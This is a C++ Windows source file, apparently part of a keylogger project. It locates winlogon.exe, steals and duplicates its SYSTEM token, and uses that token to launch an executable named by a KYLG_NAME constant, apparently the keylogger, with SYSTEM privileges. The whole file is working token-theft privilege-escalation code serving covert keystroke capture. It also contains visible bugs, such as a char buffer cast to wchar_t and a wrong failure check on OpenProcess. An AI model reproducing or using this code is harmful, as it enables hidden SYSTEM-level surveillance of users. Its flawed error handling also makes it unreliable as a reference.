#include "tinky.hpp"
#include "utils.hpp"
#include <tlhelp32.h>
#include <iostream>

using namespace std;

tinky_t tinky;

wstring itostring(DWORD i) {
	char buffer[16] = {};
	itoa((int)i, buffer, 10);
	return (wstring((wchar_t *)buffer));
}

wstring getServicePath(const wstring name) {
	wchar_t currentDirectory[MAX_PATH] = {};

	GetCurrentDirectoryW(MAX_PATH, currentDirectory);
	return (wstring (currentDirectory + wstring(L"\\") + name + wstring(L".exe")));
}

static DWORD findProcessId(const wchar_t *process_name)
{
	HANDLE process_snap = {};
	PROCESSENTRY32 process_entry = {};
	DWORD result = 0;

	process_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (INVALID_HANDLE_VALUE == process_snap)
		return(FAILURE);

	process_entry.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(process_snap, &process_entry)) {
		wcerr << L"Failed to find pid... Error code: " << itostring(GetLastError()) << '\n';
		CloseHandle(process_snap);
		return (FAILURE);
	}
	
	do {
		if (!wcscmp(process_name, process_entry.szExeFile)) {
			std::wcout << L"Process name: " << process_name << '\n';
			result = process_entry.th32ProcessID;
			break ;
		}
	} while (Process32Next(process_snap, &process_entry));

	CloseHandle(process_snap);
	return (result);
}

void impersonate(void) {
	DWORD pid = findProcessId(L"winlogon.exe");
	HANDLE winlogonHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	wcerr	<< "Avant: " << GetLastError() << '\n';
	if (winlogonHandle == INVALID_HANDLE_VALUE)
		wcout << L"Failed to open process... Error code: " << itostring(GetLastError()) << L"\n";
	wcerr	<< "Apres: " << GetLastError() << '\n';
	if (!OpenProcessToken(winlogonHandle, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &tinky.systemToken))
		wcout << L"Failed to open process token... Error code: " << itostring(GetLastError()) << L"\n";
	wcerr	<< "Apres: " << GetLastError() << '\n';
	wcout << L"Token impersonate success\n";
}

int main () {
	impersonate();
	wstring processPath = getServicePath(KYLG_NAME);
	wcerr << L"Found process path: " << processPath << '\n';

	HANDLE primaryToken;
	DuplicateTokenEx(
		tinky.systemToken,
		TOKEN_ALL_ACCESS,
		NULL,
		SecurityImpersonation,
		TokenPrimary,  // ← ICI : primary token
		&primaryToken
	);
	if (!CreateProcessAsUserW(
		primaryToken,
		processPath.c_str(),
		NULL, NULL, NULL,
		FALSE,
		0, NULL, NULL,
		&tinky.startupInfo,
		&tinky.processInfo
	)) {
		wcerr << L"Process failed to launch with code: " << itostring(GetLastError()) << '\n';
		return (FAILURE);
	}
	wcerr << L"Process launched\n";
	return (SUCCESS);
}